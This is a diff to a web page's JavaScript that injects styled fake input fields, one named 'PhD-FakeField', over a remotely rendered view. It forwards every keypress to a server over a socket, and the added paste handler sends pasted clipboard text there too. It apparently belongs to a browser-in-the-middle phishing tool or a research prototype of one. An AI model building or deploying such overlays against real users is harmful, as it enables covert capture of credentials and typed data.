@@ -106,29 +106,51 @@ window.onload = function beginCommunication() {
             wrapper.appendChild(htmlClickable);
             break;
         case 'I': // inject clickable
-            
             var configFragments = originalMessage.split("||");
-            var location = configFragments[7].split(",");
-            var dimension = configFragments[8].split(",");
+            var location = configFragments[0].split(",");
+            var dimension = configFragments[1].split(",");
+            var borders = configFragments[6].split("|!|");
+            var paddings = configFragments[7].split("|!|");
+            var fonts = configFragments[8].split("|!|");
+
             var htmlClickable = document.createElement("input");
-            htmlClickable.type = configFragments[3];
-            htmlClickable.style.position = "absolute";
             htmlClickable.style.left = location[0] + 'px';
             htmlClickable.style.top = location[1] + 'px';
             htmlClickable.style.width = dimension[0] + 'px';
             htmlClickable.style.height = dimension[1] + 'px';
-            htmlClickable.text = configFragments[2];
-            //htmlClickable.style.cursor = "pointer";
-            htmlClickable.style.background = configFragments[0];
-            htmlClickable.style.placeholder = configFragments[1];
-            htmlClickable.style.border = "none"; //configFragments[4];
+
+            htmlClickable.type = configFragments[2];
+            htmlClickable.style.background = configFragments[3];
+            htmlClickable.placeholder = configFragments[4];
+            htmlClickable.value = configFragments[5];
+
+            htmlClickable.style.position = "absolute";
             htmlClickable.style.outline = "none";
-            //htmlClickable.style.font = configFragments[5];
-            htmlClickable.style.font = "16px arial,sans-serif";//configFragments[5];
-            htmlClickable.padding = configFragments[6];
-            //htmlClickable.style.opacity = "0.9";
+            htmlClickable.style.borderLeft = borders[0];
+            htmlClickable.style.borderBottom = borders[1];
+            htmlClickable.style.borderRight = borders[2];
+            htmlClickable.style.borderTop = borders[3];
+
+            htmlClickable.style.paddingLeft = paddings[0];
+            htmlClickable.style.paddingBottom = paddings[1];
+            htmlClickable.style.paddingRight = paddings[2];
+            htmlClickable.style.paddingTop = paddings[3];
+
+            htmlClickable.style.fontColor = fonts[0];
+            htmlClickable.style.fontFamily = fonts[1];
+            htmlClickable.style.fontSize = fonts[2];
+            htmlClickable.style.fontStyle = fonts[3];
+            htmlClickable.style.fontWeight = fonts[4];
+
+            htmlClickable.onpaste = function sendCopyPasteUpdate(event) {
+                var pastedData = event.clipboardData.getData('text');
+                socketC.send("P:" + pastedData);
+                console.log("Submitted copy paste event: " + pastedData);
+            }
+
             htmlClickable.id = "PhD-FakeField";
             wrapper.appendChild(htmlClickable);
+
             console.log("Received input element.");
             break;
         }
@@ -154,7 +176,7 @@ window.onload = function beginCommunication() {
         // this listener forwards all printable char codes (chars) to the server
         var charCode = event.charCode;
         //event.preventDefault();
-        //event.stopPropagation();
+        event.stopPropagation();
         socketC.send("K:" + charCode);
         console.log("Sent key press code: " + charCode);
         await sleep(100);
@@ -165,11 +187,12 @@ window.onload = function beginCommunication() {
     document.onkeydown = async function(event) {
         // this listener forwards major control key codes to the server
         var keyCode = event.keyCode;
+        //console.log("KeyDown: " + keyCode);
         if (keyCode == 8 || keyCode == 9 || keyCode == 13 || keyCode == 27 || keyCode == 33 || keyCode == 34 || keyCode == 35 || keyCode == 36 || keyCode == 37 || keyCode == 38 || keyCode == 39 || keyCode == 40 || keyCode == 45 || keyCode == 46) { // these are control chars
             //event.preventDefault();
-            //event.stopPropagation();
+            event.stopPropagation();
             socketC.send("L:" + keyCode);
-            console.log("Sent key up code: " + keyCode);
+            console.log("Sent key down code: " + keyCode);
             await sleep(300);
             updateView();
             await sleep(900);
@@ -201,9 +224,6 @@ window.onload = function beginCommunication() {
     document.onmouseup = async function(event) {
         mouseDown = false;
     }
-    /**window.addEventListener("hashchange", function(e) {
-        console.log("back");
-    })**/
 }
 </script>
 
